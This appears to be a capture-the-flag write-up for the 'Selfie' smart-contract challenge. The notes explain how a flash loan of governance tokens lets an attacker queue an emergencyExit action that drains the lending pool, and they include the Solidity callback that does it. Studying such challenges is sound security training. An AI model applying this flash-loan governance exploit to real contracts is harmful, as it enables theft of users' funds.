single token lending pool, governance contract instance, and methods that can be only called by governance contract.

flashloan method: receiver, _token in param should be the pool token address, no amount check so it can be zero, transfer token to receiver.
- calls onFlashLoan method on the receiver contract, passing the token address and amount and it should return this keccak256("ERC3156FlashBorrower.onFlashLoan");
- then transfer funds from reciever contract to pool, so ideally the onFlashLoan method should approve pool of the amount to be transferred back so it can successfully return the flashloan without any error 
- there is any emergency exit method that can be called by governance to transfer all funds to a specified address (receiver)
- the governance token and pool token are same. for enough vote power, attacker needs to have more than 50% of the total supply of the token.

hack idea:
- take FL, get power to vote, call emergency exit to transfer all funds to attacker's address, repay the flashloan.
- the governance function checks power when creating action and not when executing it, so we can use this for exploit 

```
function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        token.delegate(address(this));
        actionId = governance.queueAction(
            address(selfiePool), 0, abi.encodeWithSignature("emergencyExit(address)", recoveryAddr)
        );
        
        // Approve tokens to pool to it can transfer back the loan amount and complete the flash loan successfully.
        token.approve(address(selfiePool), amount + fee);
        return CALLBACK_SUCCESS;
    }
```